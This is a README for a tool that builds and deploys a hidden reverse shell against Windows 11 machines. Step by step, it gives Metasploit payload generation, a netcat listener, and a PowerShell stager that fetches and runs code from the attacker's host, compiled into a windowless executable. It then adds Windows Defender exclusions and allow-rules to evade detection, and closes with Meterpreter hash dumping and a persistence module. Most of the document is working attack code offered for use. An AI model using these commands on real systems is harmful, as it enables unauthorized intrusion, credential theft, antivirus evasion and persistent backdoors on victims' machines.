### Get-ReverseShell README

This repository provides a tool to facilitate the creation and deployment of a sneaky reverse shell on Windows 11 targets, enhancing your penetration testing capabilities. This tool allows you to establish a connection between your Kali Linux machine and the target system, providing a powerful means for further exploration.

## Prerequisites

Before using this tool, ensure that you have the following:

1. **Kali Linux:** Make sure you have Kali Linux installed, along with `msfconsole`, `msfvenom` and any web-server.
2. **Windows 11:** You need a Windows 11 machine to create an executable file from PowerShell scripts (EXE). Wine may be an option, but it's not officially supported.
3. **Target Windows 11:** The machine you intend to target.

## Configuration Variables

These variables can be adjusted according to your environment. Use Ctrl + F to locate and modify them easily.

```variables
$lhost = "192.168.0.2"                        # IP address of your Kali host
$lport = 4444                                 # Listening port on your Kali
$lport_sneaky = 5555                          # Sneaky listening port on your Kali
$lwebpath = "/var/www/html/"                  # Path to the open website on your Kali
$lwinpath = "C:\Users\w\"                     # Working path on the Windows 11 target
$lpath = "/home/k/Desktop/"                   # Path to a local directory on your Kali
$rpath = "C:\Users\w\Desktop\"                # Working path on the attacking host
$exe_name = "reverse_shell.exe"               # Name of your attacking sneaky reverse shell executable file
$sneaky_exename = "sneaky_reverse_shell.exe"  # Name of your attacking sneaky reverse shell sneaky executable file
$sneaky_psname = "sneaky_reverse_shell.ps1"   # Name of your sneaky reverse shell sneaky PowerShell file
```

## Usage

# Kali Linux
1. Press `Ctrl + Alt + t` for open a first Kali Linux terminal and execute `sudo su` and this following commands:

```bash
cd $lpath
git clone https://github.com/gh0x0st/Get-ReverseShell
cd ./Get-ReverseShell
```
2. Write `pwsh` for open a PowerShell terminal and execute the following commands for create sneaky reverse shell script:
```pwsh
Import-Module ./get-reverseshell.ps1
get-reverseshell -Ip $lhost -Port $lport_sneaky
```

3. Write your sneaky reverse shell script in the file `$lpath$sneaky_psname` after line ">> https://github.com/gh0x0st".

4. To use Meterpreter for enhanced functionality: Write `exit` and continue in first Kali Linux terminal with the following commands:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --format exe -o $lpath$exe_name lhost=$lhost lport=$lport
```
 - This commands creates EXE file for running meterpreter backdoor in the target:

5. Copy $exe_name and $sneaky_psname to web-server of your Kali Linux
```bash
cp $lpath$exe_name $lwebpath
cp $sneaky_psname $lwebpath
```

6. Start listening on the hidden reverse shell port
```bash
nc -nvlp 5555
```

## Meterpreter Reverse Shell
1. Open a new Kali terminal 2 for msfconsole and execute `sudo su` then `msfconsole` the following commands:
```msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit
```


# Windows 11
1. Open a Windows 11 PowerShell with administrator privileges and run the following commands:

```powershell
Set-ExecutionPolicy Bypass
Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false -ErrorAction SilentlyContinue
Install-Module -Name ps2exe -Force -Confirm:$false -ErrorAction SilentlyContinue
@"
# PowerShell script for downloading and executing the sneaky reverse shell
`$scriptUrl = "http://$lhost/$sneaky_psname"
`$scriptBytes = Invoke-WebRequest -Uri `$scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
`$scriptContent = [System.Text.Encoding]::UTF8.GetString(`$scriptBytes.Content)
Invoke-Expression -Command `$scriptContent
"@ | Out-File -FilePath "$lwinpath$sneaky_psname" -Encoding UTF8
Invoke-ps2exe $lwinpath$sneaky_psname $lwinpath$sneaky_exename -noconsole -noerror -nooutput -sta -x64
```

2. Send and execute the sneaky backdoor on the target machine with administrator privileges.

# Return to the Kali Linux

7. Return to the Kali terminal 1 and check for a successful connection. You should see somesthing like that:

```bash
┌──(root㉿kali)-[/home/k/Desktop]
└─# nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.0.2] from (UNKNOWN) [192.168.0.20] 62074
                                                                                                                                                                                                                                            
PS C:\Users\w\Desktop>
```

8. If successful, you can proceed with further commands in the sneaky reverse shell for allow Meterpreter Reverse Shell and expand backdoor.
```powershell
Set-ExecutionPolicy Bypass
Add-MpPreference -ExclusionProcess "cmd.exe"
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ThreatIDDefaultAction_Ids @(2147735445) -ThreatIDDefaultAction_Actions @('Allow')
Add-MpPreference -ThreatIDDefaultAction_Ids @(2147848028) -ThreatIDDefaultAction_Actions @('Allow')
Add-MpPreference -ExclusionExtension @("exe", "dll", "ps1", "vbs")
Add-MpPreference -ExclusionPath '$rpath$sneaky_exename'
Add-MpPreference -ExclusionProcess "$sneaky_exename"
Add-MpPreference -ExclusionPath '$rpath$exe_name'
Add-MpPreference -ExclusionProcess "$exe_name"
```


9. Checkout Windows Defender rules via this command
```powershell
Get-MpPreference
```
 - **Note:** If after entering the above commands you do not see any newly added rules in Windows Defender, repeat the procedure until they appear. If after some time there are still no changes, then check the launch of the hidden reverse shell with administrator privileges

10. Download $exe_name to target for meterpreter reverse shell
```powershell
Invoke-WebRequest -Uri "http://$lhost/$exe_name" -OutFile "$rpath$exe_name"
```

11. Execute $exe_name in target via  `$rpath$exe_name` or if you stay in work directory `.\$exe_name`

12. If successful, you will see a Meterpreter session opened in the Kali terminal 2 like that.
```msfconsole
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 192.168.0.2:4444 
[*] Sending stage (201798 bytes) to 192.168.0.13
[*] Meterpreter session 2 opened (192.168.0.2:4444 -> 192.168.0.13:49687) at 2024-03-10 16:16:16 +0200

meterpreter > 
```
 - Congratulations, you have a full reverse shell on your target.

## Example Commands Meterpreter

Here are some example commands you can use in the Meterpreter shell:

- `getuid`: Get the user ID of the current user.
- `getsystem`: Attempt to gain system privileges.
- `hashdump`: Retrieve hashes of all users on the target.
- `background`: Move the current session to the background.
- `help`: Display a list of available commands and their descriptions.
## 
## Example stay in target system after rebooting

exploit/windows/local/persistence_service

Feel free to explore and experiment with additional Meterpreter commands for a comprehensive assessment. Happy hacking!
